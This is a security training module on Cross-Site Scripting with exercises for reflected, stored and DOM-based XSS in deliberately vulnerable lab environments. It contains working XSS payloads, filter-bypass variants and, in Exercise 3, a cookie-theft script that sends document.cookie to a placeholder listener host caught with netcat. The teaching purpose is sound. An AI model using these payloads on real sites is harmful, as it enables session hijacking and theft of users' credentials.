## 🕸️ Subtopic 3.5: Cross-Site Scripting (XSS)

**Goal:** Understand how Cross-Site Scripting (XSS) vulnerabilities allow attackers to inject malicious client-side scripts into web pages viewed by other users, covering Reflected, Stored, and DOM-based variants. *(Cert relevance: CompTIA Sec+, eJPT, OSCP)*

**Resources:**

* **OWASP Top 10:** [A03:2021-Injection](https://owasp.org/Top10/A03_2021-Injection/) (XSS falls under Injection now) & [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* **PortSwigger Academy:** [Cross-site scripting (XSS) Labs](https://portswigger.net/web-security/cross-site-scripting)
* **XSS Payloads:** [PayloadBox XSS Payloads](https://github.com/payloadbox/xss-payload-list), [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
* **Tools:** Browser DevTools, Burp Suite / OWASP ZAP.
* **Test Environment:** OWASP Juice Shop, DVWA, `http://testphp.vulnweb.com/`, PortSwigger Academy Labs.

---

### 🔹 **Exercise 1: Finding Reflected XSS**

**Goal:** Identify Reflected XSS vulnerabilities where user input from a request (e.g., URL parameter, form field) is immediately embedded unsafely in the server's response HTML.

**Instructions:**

1.  In your test environment, identify input fields or URL parameters whose values are displayed back on the resulting page (e.g., a search term shown as "Results for: [search term]").
2.  Inject simple HTML tags like `<b>XSS</b>` or `<i>test</i>` into the parameter/field. Check the HTML source of the response page (using DevTools or Burp). Are the tags rendered as HTML or displayed as literal text (meaning they were likely sanitized/encoded)?
3.  If HTML injection works, try injecting a basic XSS payload: `<script>alert(document.domain)</script>`. Submit the request. Does an alert box pop up displaying the current domain?
4.  Try alternative basic payloads if the first fails (browsers/filters might block `alert`):
    * `<img src=x onerror=alert(1)>`
    * `<svg onload=alert(1)>`
    * `<iframe src="javascript:alert(1)">`
5.  Use Burp/ZAP Repeater to quickly test different payloads and inspect responses.
6.  **Challenge:** Find a reflected input where basic tags (`<b>`) work, but `<script>` tags are filtered or encoded. Can you find an event handler payload (like `<img src=x onerror=... >`) that bypasses the filter and executes?

---

### 🔹 **Exercise 2: Finding Stored XSS**

**Goal:** Identify Stored XSS vulnerabilities where user input containing malicious script is saved by the application (e.g., in a database) and later displayed to other users.

**Instructions:**

1.  In your test environment, identify features where user input is stored and displayed back later (e.g., user comments, profile descriptions, forum posts, product reviews).
2.  Submit input containing simple HTML tags (`<b>StoredTest</b>`) into these fields. View the page where the content is displayed. Is the HTML rendered correctly?
3.  If HTML injection works, try submitting a basic XSS payload: `<script>alert('Stored XSS: '+document.cookie)</script>`.
4.  Log out and log back in (if applicable), or view the content as another user (if possible), or simply revisit the page where the content is displayed. Does the script execute (e.g., does the alert pop up)?
5.  Examine the stored data (if you can access the database or view profile source) - is the raw script saved? Examine the HTML source where it's displayed - is the script present and not encoded?
6.  **Challenge:** If `<script>` tags are blocked, try injecting payloads using other tags and event handlers (e.g., `<img src=x onerror=alert(1)>`, `<a href="javascript:alert(1)">Click Me</a>`). Does the application filter these differently?

---

### 🔹 **Exercise 3: Basic XSS Payload - Cookie Theft**

**Goal:** Demonstrate the impact of XSS by crafting a payload to steal a user's session cookie.

**Instructions:**

1.  **Setup Listener:** On a machine you control (e.g., your attacker machine with a public IP or using ngrok), start a simple HTTP listener using netcat: `nc -lvp 80` (or another port like 8000).
2.  **Craft Payload:** Create the XSS payload (replace `<YourListenerIP>` with the actual IP/domain of your listener):
    `<script>document.location='http://<YourListenerIP>/?c='+document.cookie</script>`
    (For HTTPS sites, the listener might also need to handle HTTPS or use a different exfiltration method).
3.  **Inject:** Find an XSS vulnerability (Reflected or Stored) in your test application. Inject this payload.
4.  **Trigger:** Simulate a victim user Browse the page containing the injected payload (e.g., visit the reflected XSS URL, view the comment with the stored XSS).
5.  **Observe Listener:** Check your `nc` listener. Did it receive an incoming HTTP request? Examine the request path. Does it contain `/` followed by the victim's cookie(s)?
6.  **Challenge:** Why might this basic cookie theft not work if the target session cookie has the `HttpOnly` flag set? How might an attacker achieve session hijacking even if `HttpOnly` is set (research other techniques like stealing CSRF tokens or performing actions via XHR)?

---

### 🔹 **Exercise 4: Introduction to DOM-Based XSS**

**Goal:** Understand how XSS can occur purely client-side when JavaScript unsafely handles user input (often from URLs) and writes it to the DOM.

**Instructions:**

1.  Find an application feature where client-side JavaScript reads data from the URL (e.g., the fragment `#`, or query parameters via `window.location.search`) and uses it to dynamically modify the page content (e.g., using `innerHTML`, `document.write`, or passing it to `eval`). PortSwigger Academy labs are excellent for this.
2.  Use Browser DevTools (Debugger/Sources) to step through the relevant client-side JavaScript code. Observe where the input is read (`source`) and where it is written to the DOM (`sink`).
3.  Analyze if the data is sanitized or encoded *before* being written to the sink.
4.  Try crafting input in the URL (e.g., `http://vulnerable.site/page#<img src=x onerror=alert(1)>`) that will be processed by the vulnerable JavaScript sink and cause script execution when the page loads or interacts.
5.  Use the DevTools Console to look for errors or confirm execution. Unlike Reflected/Stored XSS, the payload might not appear directly in the initial HTML source from the server but gets executed later by client-side scripts.
6.  **Challenge:** Research common JavaScript functions that are dangerous "sinks" if they process untrusted user input (e.g., `innerHTML`, `document.write`, `eval`, `setTimeout` with string arguments).

---

### 🧪 **Lab: PortSwigger Academy XSS Labs**

**Goal:** Practice identifying and exploiting various types of XSS vulnerabilities in realistic scenarios.

**Instructions:**

* Navigate to the [PortSwigger Web Security Academy's XSS section](https://portswigger.net/web-security/cross-site-scripting).
* Complete the following labs (or similar):
    * "Reflected XSS into HTML context with nothing encoded"
    * "Stored XSS into HTML context with nothing encoded"
    * "DOM XSS in `document.write` sink using source `location.search`"
    * (Optional Challenge) "Reflected XSS into attribute with angle brackets HTML encoded" (Requires bypassing filters)

---